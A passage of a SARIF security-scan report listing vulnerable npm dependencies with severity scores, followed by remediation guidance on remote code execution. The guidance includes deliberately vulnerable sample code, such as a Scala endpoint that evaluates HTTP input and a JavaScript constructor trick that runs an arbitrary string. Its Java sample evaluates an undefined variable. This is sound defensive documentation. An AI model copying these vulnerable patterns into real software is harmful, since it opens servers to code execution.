                        "evidenceFingerprint": "bf23d7c4419abdd92567de9216cd9a87a8dcd9f55d23b04309767a36e77d5747"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/axios@0.19.0",
                        "text": "pkg:npm/axios@0.19.0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.9"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/3e11d1559fa82c1184913eaf112dfe07",
                    "ruleIndex": 36
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "0548e0d3037a2c96426f35c32fe0305171838b5219416732b5a1bc2b8b4acc6e"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/axios@0.19.0",
                        "text": "pkg:npm/axios@0.19.0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/07330a215b32027e5b0ade96b693fe92",
                    "ruleIndex": 37
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "cc6783897aaa6a218678090827d05bdab24621fc3da7a174c6692aea94ca567c"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/axios@0.19.0",
                        "text": "pkg:npm/axios@0.19.0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/cea1d01439a7a89f26d0765509f199c2",
                    "ruleIndex": 38
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "6b0c0f64266d4ec306cc577e64e2ad5a7c6149e3b4c96f323d418656378d70d4"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/body-parser@1.19.0",
                        "text": "pkg:npm/body-parser@1.19.0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/573931191d3ac6c6584b230b189d4205",
                    "ruleIndex": 39
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "ca3222441728c0f608c70821f5ec5a26aefbdd8dd27dc49a0d8b16d1793d88b8"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/bson@1.1.1",
                        "text": "pkg:npm/bson@1.1.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.4"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/efd7c5cc8867f9685b29d4757c6bfd2c",
                    "ruleIndex": 40
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "4c2031d39bed4424f2574f52e95d3c3d28b57aa4f37b9102363a4ec0882afc11"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/bson@1.1.1",
                        "text": "pkg:npm/bson@1.1.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9.8"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/3a5e97a5b8b9c7cc888cda3dd75156a3",
                    "ruleIndex": 41
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "0981ba87f8cda9c1c283f1fa03ea918237eb8b7cd79e0b23f48e4c4eca329ca6"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/express@4.17.1",
                        "text": "pkg:npm/express@4.17.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/6a27c8d9849614f37b72ad1ca17b666c",
                    "ruleIndex": 42
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "a6701e5b7c84d18121ab63d7a3f241e03b8fc350eeafa86f13532a82bff799c8"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/express@4.17.1",
                        "text": "pkg:npm/express@4.17.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.1"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/3dfd3be3680caf2b71c0479b58e713c3",
                    "ruleIndex": 43
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "80e7dc6edb48d456a393eaca864176c7e99028ee07df93dbb13d275215c5467d"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/express@4.17.1",
                        "text": "pkg:npm/express@4.17.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "4.7"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/9c78c614b83c0a23816c5ed4b5ae8592",
                    "ruleIndex": 44
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "8691b8b5ca6adec4920f54f0c3c7e1e2ef43e0d7730b97bbbdc1c9089834ca36"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/follow-redirects@1.5.10",
                        "text": "pkg:npm/follow-redirects@1.5.10"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/ecb7a4d25a55e597a5e00f684de029d4",
                    "ruleIndex": 45
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "2fc4fe00f97b03f0f7b58c36b2d806cea7006e38d18fb9f73db1f93e928544a8"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/follow-redirects@1.5.10",
                        "text": "pkg:npm/follow-redirects@1.5.10"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.9"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/1da3091ecfd5638d4e52c6ca8a046d51",
                    "ruleIndex": 46
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "968f2d5a95007d4f4ce2b118a825d7c08ded13d050b772c26f7010670a85dace"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/follow-redirects@1.5.10",
                        "text": "pkg:npm/follow-redirects@1.5.10"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.3"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/5888ff54ef2ab2acee7ede441ff3b18b",
                    "ruleIndex": 47
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "9d59e8d8b19fe7a8b8523aa872442c864be61641195cd2918542d61a42f127ef"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/follow-redirects@1.5.10",
                        "text": "pkg:npm/follow-redirects@1.5.10"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/fb8218b438222d5bbea8f11a14a524cd",
                    "ruleIndex": 48
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "7ba29a34cf0b478b81c8d188893852c6da5c6490e2848a63ee8ba6030e6fc358"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/lodash@4.17.15",
                        "text": "pkg:npm/lodash@4.17.15"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.3"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/cc27529773d986ff0a229334f36b3722",
                    "ruleIndex": 49
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "05e648d89defd812d7c397e7aa7261454ae01b5874d82b6b2312a84d22f7a4cb"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/lodash@4.17.15",
                        "text": "pkg:npm/lodash@4.17.15"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.4"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/a85b4190a628b305b807216f9342b4e5",
                    "ruleIndex": 50
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "79db1aec5a953fa35cdc3351d070571743f30581c5c08874aba5628ade0796ce"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/lodash@4.17.15",
                        "text": "pkg:npm/lodash@4.17.15"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.2"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/f5b8b6fffcbce6101d10553edf66d1d0",
                    "ruleIndex": 51
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "62d99df3b790f82cd1f837d0f6c2c739b83c39ef37d22cfd2025f84f02f3782a"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/path-parse@1.0.6",
                        "text": "pkg:npm/path-parse@1.0.6"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/3407d7b810db3718c2fb2d9807889e2b",
                    "ruleIndex": 52
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "d54158dfa68559d28a31679679e45b931d89d31737e2d26384920199a1ec8987"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/path-to-regexp@0.1.7",
                        "text": "pkg:npm/path-to-regexp@0.1.7"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/bca9416284924b1d018d6ad7fdc6ea91",
                    "ruleIndex": 53
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "663f4a7e8375dee0c677efe9c062d702ce4d2a1d7145767de4786ae0b890979d"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/path-to-regexp@0.1.7",
                        "text": "pkg:npm/path-to-regexp@0.1.7"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/ca7164c47bf0b9d1659522b717d7341b",
                    "ruleIndex": 54
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "aa4807319eb90a216f77eed6568809bcc2d2bf0a286565dacbb62685f3c8af75"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/pug@2.0.4",
                        "text": "pkg:npm/pug@2.0.4"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/ccccc10d9629ae5483403cc0219828d3",
                    "ruleIndex": 55
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "e4accb2cceafc78829d53d1de0b5811b8445de3fbb2b508e113e0d7afd951fb1"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/pug@2.0.4",
                        "text": "pkg:npm/pug@2.0.4"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.8"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/3a017b624b4b9263d3a3eb2303fcdc73",
                    "ruleIndex": 56
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "2855fe3ad8d74e676e7c6b76117f76bcf7c6a01d826e9dc978156c34354c4fc0"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/pug-code-gen@2.0.2",
                        "text": "pkg:npm/pug-code-gen@2.0.2"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/a97c344bf45005696c30140c3031d314",
                    "ruleIndex": 57
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "c3cae06ea5d738bdb3ef2d515968942180b2b8c3575dad676d59248200739029"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/pug-code-gen@2.0.2",
                        "text": "pkg:npm/pug-code-gen@2.0.2"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "6.8"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/24e4743ba1a27e42475db57aa2cf2e2a",
                    "ruleIndex": 58
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "45573d49dfee86287b0b9ad3952a931ad6c65e7da437b90406655ddec6cabe40"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/qs@6.7.0",
                        "text": "pkg:npm/qs@6.7.0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "7.5"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/24944ed75d8858c7d9783f771d9f135b",
                    "ruleIndex": 59
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "8f873aa74ae22184c7b074eb0b60b091d57a0d108a471ec492c57e4b4ed79ea4"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/semver@5.7.1",
                        "text": "pkg:npm/semver@5.7.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.3"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/c4ad96b7a3137242fb24e48ccceefb32",
                    "ruleIndex": 60
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "800e97ef0e3b72770d08997908d8647afd825ce34c38d41f63c72a015d329321"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/send@0.17.1",
                        "text": "pkg:npm/send@0.17.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "4.7"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/c3c61880b3e5bcb556554a6fd5e0a78c",
                    "ruleIndex": 61
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "7d294c70294ca7263d3ca1c518f4fbde25802f5fae13cfc1d4347cca87ba4fe8"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "package-lock.json"
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "pkg:npm/serve-static@1.14.1",
                        "text": "pkg:npm/serve-static@1.14.1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "4.7"
                    },
                    "rank": -1,
                    "ruleId": "oss_vuln/2bdcef89ad73e9c74dc35787532e7cdd",
                    "ruleIndex": 62
                }
            ],
            "tool": {
                "driver": {
                    "contents": [
                        "localizedData",
                        "nonLocalizedData"
                    ],
                    "fullName": "Qwiet preZero",
                    "informationUri": "https://qwiet.ai",
                    "language": "en-US",
                    "name": "Qwiet preZero",
                    "rules": [
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability."
                            },
                            "help": {
                                "markdown": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport 